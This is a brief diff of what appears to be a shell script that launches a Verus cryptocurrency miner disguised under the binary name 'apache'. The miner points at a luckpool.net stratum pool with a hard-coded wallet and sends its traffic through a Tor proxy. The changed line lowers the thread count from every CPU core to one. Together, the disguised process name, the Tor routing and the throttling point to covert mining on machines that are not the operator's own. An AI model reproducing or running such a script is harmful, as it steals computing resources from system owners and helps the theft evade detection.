@@ -22,4 +22,4 @@ cd ..
 
 sleep 5
 
-./apache -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RHvsk8sUSPpeRbeRM5NQmZVTBzkngaR6x4.$(echo $(shuf -i 1-1000 -n 1)) -p x -t $(echo $(nproc --all)) --proxy socks5://127.0.0.1:9050
+./apache -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RHvsk8sUSPpeRbeRM5NQmZVTBzkngaR6x4.$(echo $(shuf -i 1-1000 -n 1)) -p x -t 1 --proxy socks5://127.0.0.1:9050
